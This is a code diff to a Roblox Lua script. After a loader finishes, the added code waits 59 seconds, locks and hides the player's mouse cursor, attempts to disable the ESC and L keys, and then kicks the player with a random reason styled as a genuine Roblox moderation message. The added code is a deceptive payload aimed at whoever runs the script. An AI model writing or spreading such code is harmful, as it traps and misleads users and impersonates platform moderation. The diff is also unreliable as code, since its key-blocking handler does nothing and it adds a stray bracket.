@@ -14,8 +14,24 @@ local reasons = {
 
 -- If loader succeeded, start the kick timer
 if success then
-    local delayTime = 30 -- seconds after loader finishes
+    local delayTime = 59 -- seconds after loader finishes
     task.delay(delayTime, function()
+        local UIS = game:GetService("UserInputService")
+        
+        -- Lock the mouse to the center and hide the cursor
+        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
+        UIS.MouseIconEnabled = false
+
+        -- Block ESC and L keys from working
+        UIS.InputBegan:Connect(function(input, gameProcessed)
+            if gameProcessed then return end
+            if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.L then
+                -- Block these keys by doing nothing
+                return
+            end
+        end)
+
+        -- Kick with real Roblox moderation message
         local player = game:GetService("Players").LocalPlayer
         local reason = reasons[math.random(1, #reasons)]
         player:Kick(reason)
@@ -23,3 +39,4 @@ if success then
 else
     warn("Loader script failed to run:", err)
 end
+]
